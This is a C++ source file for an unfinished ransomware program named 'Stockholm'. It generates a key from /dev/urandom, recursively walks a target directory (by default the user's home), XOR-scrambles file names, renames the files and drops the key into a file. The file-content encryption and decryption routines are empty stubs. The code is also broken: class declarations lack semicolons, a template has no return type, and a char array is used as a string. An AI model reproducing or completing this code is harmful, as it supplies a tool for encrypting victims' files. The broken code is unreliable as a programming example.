#include <string>
#include <iostream>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/stat.h>

template<typename T> xor_algo(T &data, size_t data_len, const char *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

class data {
    std::string message;
    char key[28];
    std::string path;
    size_t key_size;
}

class Stockholm {
    public:
        void ransome_ware(data *d);
        void rakmanji(data *d);
    private:
        void encrypt_xor(std::string &path, data *p);
        void write_in_file(std::string &path , std::string &message);
        void generate_key(std::string &key , size_t length);
        void leave_message(data *d);
        void bad_trip(std::string &path, data *info);
}

void Stockholm::write_in_file(std::string &path , std::string &message){
    int fd = open(path.c_str(), O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    if(fd == -1){
        write(2,"bad trip",strlen("bad trip"));
        return;
    }
    write(fd, message.c_str(), message.size());
    close(fd);
}

void Stockholm::encrypt_xor(std::string &path, data *p){
    // encryption logic here
}

void Stockholm::generate_key(std::string &key , size_t length){
    char characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()__+/";
    FILE* urandom = fopen("/dev/urandom", "r");
    if (urandom == NULL) {
        fprintf(stderr, "Failed to open /dev/urandom\n");
        exit(1);
    }
    key.clear();
    for (size_t i = 0; i < length; i++) {
        unsigned char random_value;
        fread(&random_value, sizeof(random_value), 1, urandom);
        key += characters[random_value % (sizeof(characters) - 1)];
    }
    key += '\0';
    fclose(urandom);
}

void Stockholm::leave_message(data *d){
    std::string path = d->path + "/" + " ";
    int fd = open(path.c_str(), O_CREAT | O_WRONLY, S_IRUSR | S_IWUSR);
    if(fd == -1){
        write(2,"bad trip",strlen("bad trip"));
        return;
    }
    write(fd, d->key.c_str(), d->key.size());
    close(fd);
    std::string readme_path = d->path + "/Desktop/readme.txt";

}

void Stockholm::bad_trip(std::string &path, data *info){
    DIR *dir = opendir(path.c_str());
    if (dir == NULL) {
        return;
    }
    struct dirent *entry;
    while((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            std::string full_path = path + "/" + entry->d_name;
            struct stat path_stat;
            stat(full_path.c_str(), &path_stat);
            if (S_ISDIR(path_stat.st_mode)) {
                bad_trip(full_path, info);
            } else {
                encrypt_xor(full_path, info);
                std::string encrypted_name = entry->d_name;
                xor_algo(encrypted_name, encrypted_name.size(), info->key.c_str(), info->key_size);
                std::string new_full_path = path + "/" + encrypted_name;
                if (rename(full_path.c_str(), new_full_path.c_str()) != 0) {
                    perror("Failed to rename file");
                }
                std::cout << path << std::endl;
            }
        }
    }

}

void Stockholm::ransome_ware(data *d){
    generate_key(d->key, d->key_size);
    // bad_trip(d->path, d);
    leave_message(d);

}
int main(int ac , char **av){
    if (!av[1]){
        std::cout << "This program will encrypt your files in the specified path. try -h for instructions" << std::endl;
        return 1;
    } else if(av[1] == std::string("-h")){
        std::cout << "This program will encrypt your files in the specified path." << std::endl;
        std::cout << "Usage:" << av[0] << "-option <path> (default == $home)" << std::endl;
        std::cout << "Examples: "  << std::endl;
        std::cout << "Decryption" << av[0] << "-d <path> <key>" << std::endl;
        std::cout << "Encryption" << av[0] << "-e <path>" << std::endl;
        return 0;
    }else if(av[1] == std::string("-e")){
        data p;
        p.key_size = 28;
        if(av[2]){
            p.path = av[2];
        } else {
            p.path = getenv("HOME");
        }
        Stockholm stockholm;
        stockholm.ransome_ware(&p);
    }else if(av[1] == std::string("-d")){
        // decryption part
    }
}